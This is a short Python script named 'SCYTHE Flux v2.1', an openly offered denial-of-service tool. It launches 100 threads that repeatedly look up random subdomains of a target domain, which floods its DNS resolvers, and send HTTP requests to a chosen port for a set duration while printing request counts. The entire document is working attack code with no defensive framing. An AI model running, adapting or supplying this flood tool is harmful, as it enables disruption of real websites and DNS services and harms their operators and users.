# SCYTHE Flux v2.1
import sys, socket, time, random, string, threading
if len(sys.argv) < 5: print('Usage: python3 flux.py <domain> <port> <time> [threads]'); sys.exit(1)
domain, port, duration = sys.argv[1], int(sys.argv[2]), int(sys.argv[3])
print(f'[SCYTHE] Flux: {domain} | {duration}s')
total, resolved = 0, 0
lock = threading.Lock()
def random_sub(): return ''.join(random.choices(string.ascii_lowercase + string.digits, k=random.randint(10, 30)))
def attack():
  global total, resolved
  end = time.time() + duration
  while time.time() < end:
    try:
      subdomain = f'{random_sub()}.{domain}'
      try:
        ip = socket.gethostbyname(subdomain)
        with lock: resolved += 1
      except: ip = socket.gethostbyname(domain)
      s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      s.settimeout(2)
      try: s.connect((ip, port)); s.send(f'GET / HTTP/1.1\r\nHost: {subdomain}\r\n\r\n'.encode()); s.close()
      except: pass
      with lock: total += 1
    except: pass
for _ in range(100):
  threading.Thread(target=attack, daemon=True).start()
start = time.time()
while time.time() - start < duration:
  print(f'[FLUX] Requests: {total} | Resolved: {resolved} | Elapsed: {time.time()-start:.1f}s')
  time.sleep(1)
print(f'[FLUX] Completed: {total} requests')